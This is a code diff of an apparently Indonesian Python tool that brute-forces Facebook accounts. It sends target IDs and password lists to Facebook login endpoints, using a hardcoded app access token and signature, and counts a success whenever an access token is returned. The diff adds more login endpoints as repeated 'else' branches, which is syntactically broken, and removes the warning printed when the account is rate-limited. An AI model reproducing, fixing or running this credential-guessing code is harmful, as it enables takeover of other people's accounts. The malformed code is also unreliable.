@@ -175,6 +175,12 @@ class Data(Main):
 					kirim.submit(Crack(self.token,self.id,self.name).b_api,"https://b-api.facebook.com",id,pwList)
 				else:
 					kirim.submit(Crack(self.token,self.id,self.name).mbasic,"https://mbasic.facebook.com",id,pwList)
+				else:
+					kirim.submit(Crack(self.token,self.id,self.name).Free,"https://free.facebook.com",id,pwList)
+				else:
+					kirim.submit(Crack(self.token,self.id,self.name).moblie,"https://m.facebook.com",id,pwList)
+				else:
+					kirim.submit(Crack(self.token,self.id,self.name).Touch,"https://touch.facebook.com",id,pwList)
 		exit("[!] Crack selesai....")
 
 class Crack(Main):
@@ -199,7 +205,7 @@ class Crack(Main):
 			pw=pw.lower()
 			response = session.get(url+"/method/auth.login",params={'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'id_ID', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'})
 			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response.text:
-				print("\r[!] Opss! Terkena spam... nyalakan mode pesawat selama 2 detik!\n",end="")
+				print("\r  \n",end="")
 				continue
 			if 'access_token' in response.text and 'EAAA' in response.text:
 				ok+=1
